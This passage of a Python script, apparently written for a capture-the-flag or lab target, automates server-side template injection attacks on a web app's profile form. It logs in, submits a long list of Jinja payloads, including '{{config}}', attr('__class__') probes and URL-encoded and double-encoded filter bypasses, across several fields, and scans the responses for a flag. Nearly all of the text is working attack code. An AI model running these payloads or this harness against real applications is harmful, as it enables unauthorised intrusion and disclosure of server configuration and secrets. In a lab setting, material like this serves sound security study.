    return result

def test_multi_field_injection(session_cookie: str) -> Dict[str, Any]:
    """Test injecting SSTI payloads in multiple fields simultaneously"""
    
    print(f"\n{'='*80}")
    print(f"[TEST] Multi-field injection")
    
    cookies = {"session": session_cookie}
    
    # Try SSTI in multiple numeric fields at once
    profile_data = {
        "age": "1e2",  # Scientific notation
        "income": "{{7*7}}",  # Direct SSTI
        "monthly_payment": "100{##}0",  # Jinja comment
        "email": "{{config}}@test.com"  # SSTI in email
    }
    
    print(f"[PAYLOAD] Multi-field: {profile_data}")
    
    resp = requests.post(
        f"{BASE_URL}/profile",
        data=profile_data,
        cookies=cookies,
        allow_redirects=False
    )
    
    print(f"[RESPONSE] Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    result = {
        "description": "Multi-field injection",
        "status": resp.status_code,
        "flag_found": False
    }
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"[!!! FLAG FOUND !!!] {flag_match.group(0)}")
        print(f"[FULL RESPONSE]\n{resp.text}")
        result["flag_found"] = True
        result["flag_value"] = flag_match.group(0)
        return result
    
    # Check downstream pages
    if resp.status_code in [200, 302]:
        for endpoint in ["/loan_details", "/home", "/profile"]:
            resp_check = requests.get(f"{BASE_URL}{endpoint}", cookies=cookies)
            print(f"[CHECK] {endpoint} - Status: {resp_check.status_code}")
            
            flag_match = re.search(r'FLAG\{[^}]+\}', resp_check.text)
            if flag_match:
                print(f"[!!! FLAG FOUND !!!] {flag_match.group(0)}")
                print(f"[FULL RESPONSE]\n{resp_check.text}")
                result["flag_found"] = True
                result["flag_value"] = flag_match.group(0)
                result["flag_location"] = endpoint
                return result
    
    return result

def main():
    print("[*] Starting SSTI Filter Bypass Testing")
    print(f"[*] Target: {BASE_URL}")
    
    # Step 1: Login
    print("\n[STEP 1] Logging in...")
    session_cookie = login()
    
    if not session_cookie:
        print("[ERROR] Failed to obtain session cookie")
        return
    
    # Step 2: Define test payloads
    payloads = [
        # Numeric-looking
        ("1e2", "monthly_payment", "Scientific notation (known working)"),
        ("1e10", "monthly_payment", "Large scientific notation"),
        ("2e3", "monthly_payment", "Scientific notation variant"),
        
        # Jinja comments
        ("100{##}0", "monthly_payment", "Jinja comment injection"),
        ("50{#comment#}00", "monthly_payment", "Jinja comment with text"),
        ("1{##}000", "monthly_payment", "Comment at start"),
        
        # String operations
        ("1|string", "monthly_payment", "Pipe to string filter"),
        ("100|int", "monthly_payment", "Pipe to int filter"),
        ("100|int|string", "monthly_payment", "Chained filters"),
        
        # Attribute access
        ("100|attr", "monthly_payment", "Attribute access filter"),
        ("1|attr('__class__')", "monthly_payment", "Attr with class"),
        
        # URL encoded
        ("%7B%7B7*7%7D%7D", "monthly_payment", "URL encoded SSTI"),
        ("%7B%7Bconfig%7D%7D", "monthly_payment", "URL encoded config"),
        
        # Double encoded
        ("%257B%257B7*7%257D%257D", "monthly_payment", "Double URL encoded"),
        
        # Numeric expressions
        ("(7*7)", "monthly_payment", "Expression without braces"),
        ("7*7", "monthly_payment", "Direct multiplication"),
        ("49", "monthly_payment", "Result of 7*7"),
        
        # Alternative encodings
        ("{{7*7}}", "monthly_payment", "Standard SSTI (baseline)"),
        ("{%print(7*7)%}", "monthly_payment", "Jinja statement block"),
        ("{{7*'7'}}", "monthly_payment", "String multiplication"),
        
        # Trying email field
        ("{{7*7}}@test.com", "email", "SSTI in email field"),
        ("test+{{config}}@test.com", "email", "SSTI in email with plus"),
        
        # Trying age field
        ("{{7*7}}", "age", "SSTI in age field"),
        ("1e2", "age", "Scientific notation in age"),
        
        # Trying income field
        ("{{7*7}}", "income", "SSTI in income field"),
        ("1e5", "income", "Scientific notation in income"),
    ]
    
    # Step 3: Test each payload
    print("\n[STEP 2] Testing SSTI bypass payloads...")
    results = []
    
    for payload, field, description in payloads:
        result = test_ssti_payload(session_cookie, payload, field, description)
        results.append(result)
        
        # If flag found, stop and report
        if result.get("flag_found"):
            print(f"\n{'='*80}")
            print(f"[SUCCESS] FLAG FOUND!")
            print(f"[PAYLOAD] {result['payload']}")
            print(f"[FIELD] {result['field']}")
            print(f"[LOCATION] {result.get('flag_location')}")
            print(f"[FLAG] {result.get('flag_value')}")
            print(f"{'='*80}")
            return
    
    # Step 4: Test multi-field injection
    print("\n[STEP 3] Testing multi-field injection...")
    multi_result = test_multi_field_injection(session_cookie)
    
    if multi_result.get("flag_found"):
        print(f"\n{'='*80}")
        print(f"[SUCCESS] FLAG FOUND via multi-field injection!")
        print(f"[LOCATION] {multi_result.get('flag_location')}")
        print(f"[FLAG] {multi_result.get('flag_value')}")
        print(f"{'='*80}")
        return
    
    # Summary
    print(f"\n{'='*80}")
    print("[SUMMARY]")
    print(f"Total payloads tested: {len(results)}")
    
    accepted = [r for r in results if r['status'] in [200, 302]]
    rejected = [r for r in results if r['status'] == 400]
    errors = [r for r in results if r['status'] == 500]
    
    print(f"Accepted (200/302): {len(accepted)}")
    print(f"Rejected (400): {len(rejected)}")
    print(f"Server errors (500): {len(errors)}")
    
    if accepted:
        print("\n[ACCEPTED PAYLOADS]")
        for r in accepted:
            print(f"  - {r['field']}: {r['payload']} ({r['description']})")
    
    if errors:
        print("\n[SERVER ERRORS (Potential template processing)]")
        for r in errors:
            print(f"  - {r['field']}: {r['payload']} ({r['description']})")
    
    print(f"{'='*80}")
    print("[RESULT] No FLAG found in any tested payload")

if __name__ == "__main__":
    main()

